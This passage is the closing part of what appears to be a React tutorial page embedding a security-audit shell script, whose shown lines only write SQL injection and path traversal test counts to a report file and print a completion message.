echo "SQL Injection Tests Run: $SQLI_COUNT" >> "$RESULTS_DIR/report.txt"
echo "Path Traversal Tests Run: $TRAVERSAL_COUNT" >> "$RESULTS_DIR/report.txt"

echo "[+] Audit complete. Results in: $RESULTS_DIR/"`}
      />

    </TutorialLayout>
  )
}
